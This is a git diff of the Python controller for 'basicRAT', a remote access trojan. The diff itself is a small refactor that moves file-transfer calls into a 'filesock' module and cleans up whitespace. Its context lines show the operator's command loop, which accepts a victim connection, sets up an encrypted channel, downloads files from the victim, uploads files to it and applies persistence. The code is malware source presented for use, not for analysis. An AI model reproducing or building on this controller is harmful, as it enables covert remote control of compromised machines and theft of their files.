@@ -14,7 +14,7 @@ import sys
 import time
 
 from core import common
-from core.file import recvfile, sendfile
+from core import filesock
 
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
@@ -76,11 +76,11 @@ def main():
 
     s.listen(10)
     conn, addr = s.accept()
-    
+
     DHKEY = diffiehellman(conn, server=True)
     # debug: confirm DHKEY matches
     # print binascii.hexlify(DHKEY)
-    
+
     while True:
         prompt = raw_input('[{}] basicRAT> '.format(addr[0])).rstrip()
 
@@ -113,19 +113,19 @@ def main():
         elif cmd == 'download':
             for fname in action.split():
                 fname = fname.strip()
-                recvfile(conn, fname, DHKEY)
+                filesock.recvfile(conn, fname, DHKEY)
 
         # send file
         elif cmd == 'upload':
             for fname in action.split():
                 fname = fname.strip()
-                sendfile(conn, fname, DHKEY)
+                filesock.sendfile(conn, fname, DHKEY)
 
         # regenerate DH key (dangerous! may cause connection loss!)
         # available in case a fallback occurs or you suspect eavesdropping
         elif cmd == 'rekey':
             DHKEY = diffiehellman(conn, server=True)
-            
+
         # results of persistence
         elif cmd == 'persistence':
             print 'Applying persistence mechanism...'
